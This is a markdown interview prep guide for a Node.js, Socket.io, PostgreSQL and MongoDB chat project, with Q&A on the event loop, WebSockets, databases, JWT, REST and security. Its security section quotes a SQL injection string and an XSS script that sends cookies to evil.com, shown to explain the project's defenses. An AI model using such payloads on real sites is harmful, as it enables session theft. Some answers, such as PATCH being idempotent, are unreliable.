# ⚡ ChatPulse — Interview Prep Guide (Part 2)

This is the continuation of the interview prep guide covering Node.js internals, WebSocket deep dives, database theory, security attacks, REST principles, and behavioral questions. Read Part 1 first (`INTERVIEW_PREP_PART1.md`).

---

## 🟢 Section 7: Node.js Internals

### Q24. What is the Node.js Event Loop? Why does it matter for a chat application?

**Answer:**
The Event Loop is the heart of how Node.js handles thousands of concurrent connections without using multiple threads.

Traditional web servers (like Java's Tomcat) use a **thread-per-request model**. Every incoming request gets its own thread. If you have 10,000 simultaneous users, you need 10,000 threads, each consuming roughly 1–2 MB of RAM — that's 10–20 GB just for threads.

Node.js uses a single-threaded event loop with **non-blocking I/O**:
1. When a client sends a message, Node receives it on the single thread.
2. If it needs to write to the database, it **delegates that I/O operation** to the operating system (via `libuv`) and immediately moves on to the next client event.
3. When the database finishes writing, the OS notifies Node via a **callback**. Node picks up that callback and finishes responding to that client.

So Node.js never "waits" — it keeps processing other events while I/O operations run in the background. For a chat application where most work is reading/writing to databases and sending packets across sockets (all I/O), this model is perfect. The limitation is **CPU-intensive tasks** like image compression or cryptography. Those should be offloaded using Worker Threads or separate microservices.

---

### Q25. What is the difference between `process.nextTick()`, `setImmediate()`, and `setTimeout()`?

**Answer:**
All three schedule a callback to run "later," but in different queues of the event loop:

- **`process.nextTick(cb)`**: Runs before the event loop moves to the next phase. Highest priority. Use this when you want code to run asynchronously but as soon as the current operation finishes — even before any I/O or timers.
- **`setImmediate(cb)`**: Runs at the start of the next event loop iteration, after I/O callbacks have been processed.
- **`setTimeout(cb, 0)`**: Schedules the callback after a minimum delay (0 ms in theory but never truly 0). Runs in the "timers" phase of the event loop, which is after I/O.

**In practice for our project:** We use `async/await` throughout, which is built on Promises. Promises use the **microtask queue**, which runs between every event loop phase (even higher priority than `setImmediate`). You rarely need to manually use these timer functions.

---

### Q26. What does `async/await` do behind the scenes?

**Answer:**
`async/await` is **syntactic sugar over Promises**. When you write:

```javascript
async function saveMessage(data) {
  const msg = await Message.create(data);
  return msg;
}
```

Node.js translates it to:

```javascript
function saveMessage(data) {
  return Message.create(data).then((msg) => {
    return msg;
  });
}
```

The `await` keyword tells JavaScript: "Pause executing this function and hand control back to the event loop. When the Promise resolves, resume from this line."

This is important because — **it does NOT block the event loop**. While `await Message.create(data)` is waiting for MongoDB to write, Node.js is handling other users' chat messages. This is why we can serve thousands of users simultaneously without threads.

---

## 🌐 Section 8: Express.js Deep Dive

### Q27. What is Express middleware? How does the middleware chain work?

**Answer:**
Middleware is the backbone of Express. It is simply a function with three arguments: `(req, res, next)`. Express processes incoming requests through a **pipeline of middleware functions** in the order they are registered.

```
Request → [Rate Limiter] → [CORS] → [Body Parser] → [Auth Guard] → [Route Handler] → [Error Handler] → Response
```

Each middleware can:
1. **Execute code** (e.g. log the request, check rate limits).
2. **Modify** `req` or `res` objects (e.g. attach `req.user` after JWT validation).
3. **End the cycle** by sending a response (`res.json(...)`).
4. **Pass control** to the next middleware by calling `next()`.
5. **Pass an error** by calling `next(error)`, which skips all normal middleware and jumps straight to the error handler.

In our project:
- `morgan` logs every incoming request.
- `cors` validates the origin header.
- `express.json()` parses the request body from raw bytes into a JavaScript object.
- `authMiddleware` validates the JWT and attaches `req.user`.
- Route handlers contain the actual business logic.
- `errorHandler` at the very end catches any `next(error)` calls from anywhere in the chain.

---

### Q28. What is the difference between `app.use()` and `app.get()` (or `app.post()`)?

**Answer:**
- **`app.use('/path', handler)`**: Matches **any HTTP method** (GET, POST, PUT, DELETE) for that path prefix. Primarily used for mounting middleware and sub-routers.
- **`app.get('/path', handler)`**: Matches only **GET requests** to that exact path. Used for defining specific REST endpoint handlers.

**Example in our app:**
```javascript
app.use('/api', apiLimiter);        // Applies rate limiter to ALL methods under /api
app.use('/api/rooms', roomRouter);  // Mounts the rooms router for all methods
router.get('/', listRooms);         // Handles only GET /api/rooms
router.post('/', createRoom);       // Handles only POST /api/rooms
```

---

## 🔌 Section 9: WebSockets Deep Dive

### Q29. What is the fundamental difference between HTTP and WebSocket communication?

**Answer:**

| Feature | HTTP | WebSocket |
|---------|------|-----------|
| **Connection** | Stateless, new connection per request | Persistent, single connection kept alive |
| **Direction** | Client initiates (request-response) | Bi-directional (both sides can send anytime) |
| **Overhead** | Full headers (~400–800 bytes) per request | Very small frame headers (~2–10 bytes) per message |
| **Latency** | Higher (TCP handshake every request) | Lower (connection reused) |
| **Use case** | REST APIs, page loads | Chat, live updates, gaming |

HTTP works like sending a letter — you write it, send it, and wait for a reply. WebSocket works like a phone call — the connection is open and both parties can speak at any moment.

In our app, we use **both**:
- **HTTP** for loading rooms, fetching message history, and OAuth.
- **WebSocket** for all real-time events — new messages, typing indicators, presence updates.

---

### Q30. What is the difference between Socket.io and raw WebSocket? Why did you use Socket.io?

**Answer:**
Raw WebSocket (`ws` module) is the native browser API — minimal, fast, but bare-bones. Socket.io is built on top of WebSocket and adds a layer of features that are essential in production:

| Feature | Raw WebSocket | Socket.io |
|---------|--------------|-----------|
| **Auto-reconnect** | ❌ Must implement manually | ✅ Built-in with exponential backoff |
| **Rooms** | ❌ Manual | ✅ Built-in (`socket.join('roomId')`) |
| **Namespaces** | ❌ Manual | ✅ Built-in |
| **Transport fallback** | ❌ WebSocket only | ✅ Falls back to HTTP long polling if WebSocket fails |
| **Middleware** | ❌ Manual | ✅ `io.use()` middleware support |
| **Event system** | Only raw binary/text frames | Named events (e.g. `send_message`, `typing_start`) |

---

### Q31. What is the difference between `io.emit()`, `socket.emit()`, `socket.to().emit()`, and `socket.broadcast.emit()`?

**Answer:**

- **`io.emit('event', data)`**: Broadcasts to **every connected client** on the server. Used for global presence updates.
- **`socket.emit('event', data)`**: Sends only to **the client whose socket this is**. Used for `room_joined` confirmation back to the user.
- **`socket.to('roomId').emit('event', data)`**: Sends to **everyone in a room except the sender**. Used for `user_typing`.
- **`io.to('roomId').emit('event', data)`**: Sends to **everyone in a room including the sender**. Used for `new_message` — the sender receives the server-confirmed version with MongoDB `_id` and `createdAt`.
- **`socket.broadcast.emit('event', data)`**: Sends to **every connected client except the sender**.

---

### Q32. What are Socket.io Rooms and how are they different from Namespaces?

**Answer:**
**Rooms** are lightweight, dynamic groupings within a single namespace:
- `socket.join('room-uuid')` adds this socket to that group.
- `io.to('room-uuid').emit(...)` delivers to only those sockets.
- In our app: each PostgreSQL chat room = one Socket.io room.

**Namespaces** are separate communication channels that share the same HTTP connection but have independent event handlers and middleware. Example: `io.of('/chat')` vs `io.of('/notifications')`.

For our app, Rooms are the right choice. Namespaces become useful when you have entirely different feature sets sharing the same server.

---

## 🗃️ Section 10: Database Theory

### Q33. What are ACID properties? How does PostgreSQL guarantee them?

**Answer:**
- **A — Atomicity:** A transaction is "all or nothing." If step 2 fails, step 1 is automatically rolled back.
- **C — Consistency:** The database always moves from one valid state to another. Constraints prevent invalid data.
- **I — Isolation:** Concurrent transactions do not interfere with each other. Two users joining the same room simultaneously won't corrupt data.
- **D — Durability:** Once committed, data survives crashes. PostgreSQL achieves this via a **Write-Ahead Log (WAL)**.

---

### Q34. What is the CAP Theorem? How does it apply to PostgreSQL vs MongoDB?

**Answer:**
CAP states that a distributed database can only guarantee two of three:
- **C — Consistency:** Every read gets the most recent write.
- **A — Availability:** Every request receives a response even if some nodes are down.
- **P — Partition Tolerance:** The system works even if network links between nodes fail.

Since Partition Tolerance is mandatory in practice (networks fail), the real choice is C vs A:
- **PostgreSQL (CP):** Chooses Consistency — refuses stale reads during failures. You get correct data or no data.
- **MongoDB (AP by default):** Chooses Availability — may serve slightly stale reads from secondary replicas.

This reinforces our design: PostgreSQL for sensitive user/session data, MongoDB for messages (slightly stale data is acceptable).

---

### Q35. What is the difference between SQL and NoSQL? When do you choose one over the other?

**Answer:**

| Aspect | SQL | NoSQL |
|--------|-----|-------|
| Schema | Fixed | Flexible |
| Scaling | Vertical | Horizontal (sharding) |
| Transactions | Full ACID | Limited |
| Best for | Relational data, complex queries | High-volume writes, flexible structure |

Choose SQL for relational data, strict integrity, and complex aggregations. Choose NoSQL for high write throughput, variable document structures, and horizontal scaling. In our project: Users/Rooms → SQL. Messages → NoSQL.

---

## 🔐 Section 11: JWT Deep Dive

### Q36. What is the structure of a JWT?

**Answer:**
A JWT has three parts joined by dots: `Header.Payload.Signature`

**Header:** `{ "alg": "HS256", "typ": "JWT" }` — algorithm and token type.
**Payload:** `{ "sub": "user-uuid", "type": "access", "iat": 1718700000, "exp": 1718700900 }` — claims (never put sensitive data here — it's Base64-encoded, not encrypted).
**Signature:** `HMACSHA256(base64(header) + "." + base64(payload), JWT_SECRET)` — cryptographic proof of authenticity. If any payload character changes, the signature won't match.

---

### Q37. What is `bcrypt`? How does hashing work?

**Answer:**
`bcrypt` is a slow, intentional password/token hashing algorithm:
1. Generates a random **salt** (22 chars) — ensures two identical tokens produce different hashes.
2. Runs `token + salt` through `2^saltRounds` (e.g. `2^10 = 1024`) iterations of a key derivation function.
3. Stores the result as `$2b$10$<salt><hash>` — the algorithm version, rounds, salt, and hash all embedded in one string.
4. Verification: `bcrypt.compare(plainToken, storedHash)` re-runs the algorithm with the embedded salt and checks the output.

Being slow (hundreds of guesses/sec vs billions with MD5) makes brute-force attacks on stolen hashes impractical.

---

## 🛡️ Section 12: Security Attacks

### Q38. What is SQL Injection and how did you prevent it?

**Answer:**
An attacker injects SQL code into an input field:
```
email = ' OR '1'='1
```
Causes: `SELECT * FROM users WHERE email = '' OR '1'='1'` — returns all users.

**Our prevention:**
1. **Sequelize ORM:** All queries use parameterized statements automatically — user input is treated as data, never as executable SQL.
2. **Joi validation:** Input is validated before reaching the database — special characters are rejected at the API layer.

---

### Q39. What is XSS and how did you prevent it?

**Answer:**
A user sends `<script>document.location='https://evil.com?c='+document.cookie</script>` as a message. If the frontend renders it as raw HTML, every viewer's browser executes the script.

**Our prevention:**
1. **`escHtml()` function:** Converts `<`, `>`, `"`, `&` to HTML entities before inserting any user content into the DOM.
2. **`textContent` over `innerHTML`:** For plain text content, we use `el.textContent` which never parses HTML tags.

---

### Q40. What is CSRF and why is our app not vulnerable?

**Answer:**
A malicious website tricks your browser into sending an authenticated request (using your cookies) to a bank or other site.

**Our immunity:** We don't use cookies for authentication. We use `Authorization: Bearer <JWT>` headers. Browsers block cross-origin JavaScript from setting custom headers — so `evil.com` cannot forge an authenticated request on your behalf. No cookie = no CSRF.

---

### Q41. What is a Timing Attack? Are you vulnerable?

**Answer:**
An attacker measures response time differences to guess secrets (e.g. a string comparison that stops at the first mismatching character leaks timing information about how many characters matched).

**Our defense:**
- `jsonwebtoken.verify()` uses constant-time comparison internally.
- `bcrypt.compare()` always takes the same time regardless of where the mismatch occurs.
- **Theoretical leakage:** Our email lookup query returns faster if a user doesn't exist (no bcrypt runs). Extremely difficult to exploit over variable network latency.

---

## 🌍 Section 13: REST API Design

### Q42. What are the principles of REST?

**Answer:**
1. **Client-Server Separation:** Frontend and backend are independent.
2. **Statelessness:** Every request contains all needed information (JWT sent on every call).
3. **Cacheability:** GET responses can be cached.
4. **Uniform Interface:** Resources identified by URIs, manipulated via standard HTTP methods.
5. **Layered System:** Client doesn't know if it's talking to the server, load balancer, or CDN.
6. **Code on Demand (optional):** Server can send executable code to the client.

---

### Q43. When do you use GET, POST, PUT, PATCH, and DELETE?

**Answer:**

| Method | Purpose | Idempotent? |
|--------|---------|-------------|
| GET | Retrieve resource | ✅ Yes |
| POST | Create new resource | ❌ No |
| PUT | Replace entire resource | ✅ Yes |
| PATCH | Partial update | ✅ Yes |
| DELETE | Remove resource | ✅ Yes |

Idempotent = sending the same request multiple times produces the same result as sending it once.

---

### Q44. What do the HTTP status codes you use mean?

**Answer:**

| Code | When we use it |
|------|----------------|
| 200 | Successful GET, successful action |
| 201 | Room created, user joined a room |
| 400 | Joi validation failed |
| 401 | Missing/expired/invalid JWT |
| 403 | Valid JWT but not a room member |
| 404 | Room or user not found |
| 409 | Room name already exists (unique constraint) |
| 429 | Rate limiter triggered |
| 500 | Unhandled exception |

**Key distinction:** 401 = "Who are you?" (not authenticated). 403 = "I know you, but no." (not authorized).

---

### Q45. What is CORS and how does it work?

**Answer:**
Browsers block cross-origin JavaScript requests by default (Same-Origin Policy). CORS relaxes this:
1. Browser adds `Origin: https://requester.com` header.
2. Server checks if origin is allowed.
3. If allowed: server adds `Access-Control-Allow-Origin: https://requester.com` to response.
4. Browser permits the JavaScript to read the response.

In our app: `app.use(cors({ origin: env.CLIENT_URL }))` — only our demo URL is allowed.

**Important:** CORS is browser-only. Postman and curl are not affected by it.

---

## 🐘 Section 14: Sequelize & PostgreSQL Deep Dive

### Q46. What are Sequelize associations and how did you use them?

**Answer:**
1. **`hasMany/belongsTo` (One-to-Many):** `User.hasMany(Room, { foreignKey: 'createdBy' })` — a user creates many rooms.
2. **`belongsToMany` (Many-to-Many):** `User.belongsToMany(Room, { through: RoomMember })` — users ↔ rooms via junction table.
3. **The `as` alias:** `{ include: [{ model: User, as: 'creator' }] }` — Sequelize auto-JOINs and nests the creator profile inside the room object, no manual SQL needed.

---

### Q47. What is `sequelize.sync({ alter: true })`? Why not use it in production?

**Answer:**
`sync({ alter: true })` compares model definitions to the actual database and applies non-destructive changes (adds columns, changes types).

**Why not in production:**
1. Examines all tables on every startup — adds delay.
2. Column alterations can lock tables and cause downtime.
3. No rollback — if sync fails halfway, schema is in an unknown state.

**Production alternative:** Versioned migration files (e.g. Sequelize CLI Migrations or Flyway) — each schema change is a reversible, committed script with full history.

---

### Q48. What is connection pooling? Why is it important?

**Answer:**
Opening a new database connection per request costs ~50–200ms and significant memory. A connection pool keeps pre-established connections alive and reuses them:

```javascript
pool: { max: 10, min: 2, acquire: 30000, idle: 10000 }
```

A request grabs a free connection from the pool (~1ms), runs its query, and returns the connection. This enables high concurrency without overwhelming the database with connection overhead.

---

## 🍃 Section 15: Mongoose & MongoDB Deep Dive

### Q49. What is `.lean()` in Mongoose and when should you use it?

**Answer:**
By default, Mongoose `find()` results are full Mongoose Documents with internal tracking, getters/setters, and methods like `.save()`. `.lean()` returns plain JavaScript objects instead — 2–3x faster with lower memory usage.

**Use `.lean()`** when you only need to read and return data (e.g. `getRoomMessages`).
**Don't use `.lean()`** when you need to call `.save()` or `.update()` on the result (e.g. `editMessage`, `deleteMessage`).

---

### Q50. What is a compound index in MongoDB and why did you create one on `{ roomId, createdAt }`?

**Answer:**
A compound index spans multiple fields. Our index:
```javascript
messageSchema.index({ roomId: 1, createdAt: -1 });
```

Our most frequent query: `Message.find({ roomId }).sort({ createdAt: -1 }).limit(50)`

Without the index: O(n) full collection scan — slows with every message ever sent.
With the index: O(log n) B-tree navigation — fast regardless of collection size.

Compound indexes also cover left-prefix queries — an index on `(roomId, createdAt)` also accelerates queries filtering by `roomId` alone.

---

## 🧠 Section 16: Behavioral & Project-Specific Questions

### Q51. What was the biggest challenge you faced building this project?

**Answer:**
The most technically challenging part was the **OAuth email conflict bug**. When a user tried to sign in with GitHub after already signing in with Google (same email), the server crashed with a PostgreSQL UNIQUE constraint violation on the `email` field.

The fix required redesigning the user lookup into a three-step process:
1. Look up by `providerKey` (same provider, returning user).
2. If not found, look up by `email` (same person, different provider — account linking).
3. Only if neither exists, create a new user.

**Lesson:** In multi-provider OAuth systems, treat email as the primary identity — not the provider key.

---

### Q52. How did you test this project?

**Answer:**
1. **Manual integration testing:** Two browser tabs simultaneously verifying real-time delivery, typing indicators, and presence.
2. **REST API testing:** Every endpoint tested via Postman — correct status codes, response shapes, error cases.
3. **WebSocket testing:** Used `wscat` to simulate raw Socket.io events independently of the UI.
4. **Edge case testing:** OAuth email conflict, token expiry, rate limiting.

In production, I would add Jest + Supertest for automated endpoint tests and `socket.io-client` in tests for WebSocket event verification.

---

### Q53. How would you add end-to-end encryption (E2EE)?

**Answer:**
1. On login, client generates an RSA key pair using `window.crypto.subtle.generateKey()`.
2. Public key is sent to and stored on the server. Private key stays in `IndexedDB` — never leaves the device.
3. Sender fetches recipient's public key, encrypts the message client-side, and sends ciphertext.
4. Recipient decrypts with their private key from IndexedDB.

**Trade-off:** Server cannot search, moderate, or provide cross-device message history. This is why group E2EE is complex — every message must be encrypted separately for each member's public key.

---

### Q54. How would you add file/image sharing?

**Answer:**
Use a **pre-signed URL pattern** to avoid proxying large files through Node.js:
1. Client requests an upload URL from our server.
2. Server generates a time-limited pre-signed S3 URL and returns it.
3. Client uploads the file directly to S3.
4. Client sends `send_message` with `type: 'image'` and the S3 URL.
5. Server saves to MongoDB; clients render an `<img>` tag.

Node.js is never in the file data path — keeping it fast and memory-efficient.

---

### Q55. How would you add message search functionality?

**Answer:**
**Small scale:** MongoDB full-text index: `messageSchema.index({ content: 'text' })` + `Message.find({ $text: { $search: 'query' } })`.

**Large scale:** Integrate **Elasticsearch**. On every message save, also index it in Elasticsearch asynchronously. Search queries hit Elasticsearch (inverted indexes, typo tolerance, relevance scoring). Results return MongoDB IDs; full messages are fetched from MongoDB. MongoDB remains the source of truth.

---

### Q56. How would you implement read receipts?

**Answer:**
1. New table: `message_reads (userId, messageId, readAt)`.
2. Client uses Intersection Observer API — when a message scrolls into view, send `message_read` WebSocket event.
3. Server saves receipt and broadcasts to room members.
4. Sender's UI updates the tick icon.

**Optimization:** Rather than saving every single read, send only the most recent message ID seen. Server interprets this as "user has read all messages up to this timestamp" — one record covers hundreds of older messages.

---

### Q57. How would you implement push notifications for offline users?

**Answer:**
1. On login, browser generates a Web Push subscription object (endpoint + keys). Stored in PostgreSQL linked to the user.
2. When a message is sent and the recipient is offline (detected via our in-memory presence store), server uses the `web-push` npm library to send a push notification to their subscription endpoint.
3. Client's registered Service Worker wakes up and shows a native OS notification even with the tab closed.

For mobile apps: use APNs (iOS) and Firebase Cloud Messaging (Android) instead of Web Push — same server-side concept.

---

### Q58. This project is on your resume as "Distributed" — what makes it distributed?

**Answer:**
The current implementation is **designed for distribution**:
1. **Polyglot Persistence:** System is already distributed across two separate data stores (PostgreSQL + MongoDB), each optimized for a different workload.
2. **Stateless API:** All Node.js instances can run simultaneously behind a load balancer with no coordination needed — any request can hit any server.
3. **WebSocket-ready for scaling:** Adding `socket.io-redis-adapter` (already referenced in `docker-compose.yml` comments) would instantly enable multi-server WebSocket broadcasting with zero code changes to handlers.
4. **Docker Compose:** Demonstrates distributed thinking — separating DB concerns into independently scalable containers.

The local setup runs all components on one machine for development convenience. The architecture ensures any component can move to its own server without code changes.

---

## 📋 Section 17: Quick-Fire Questions

### Q59. What is the difference between `null` and `undefined` in JavaScript?
`undefined` = declared but never assigned. `null` = explicitly assigned to mean "no value." In our Mongoose schema: `editedAt: null` means intentionally "never edited." Accessing a non-existent object property returns `undefined` (unintentional absence).

### Q60. What is optional chaining (`?.`)? Where did you use it?
Safely accesses nested properties without throwing if any intermediate value is null/undefined. `profile.emails?.[0]?.value` — if `emails` is null, returns `undefined` instead of crashing with TypeError. Used throughout `passport.js` when extracting email/avatar from OAuth profiles since providers vary in what fields they return.

### Q61. What is `Promise.all()` and when would you use it?
`Promise.all([p1, p2, p3])` runs multiple async operations **in parallel** and waits for all to complete. If any fails, the entire call rejects. Example use: fetching room details, member list, and recent messages simultaneously — 3x faster than sequential `await` calls.

### Q62. What is a Race Condition? Is our app vulnerable?
A race condition occurs when the result depends on timing of concurrent operations. Two users simultaneously creating a room with the same name could both pass the "does this name exist?" check and both try to insert. Our defense: the `UNIQUE` constraint on `rooms.name` in PostgreSQL. PostgreSQL's row-level locking ensures only one INSERT succeeds; the other receives a unique constraint error which we catch and return as `409 Conflict`.
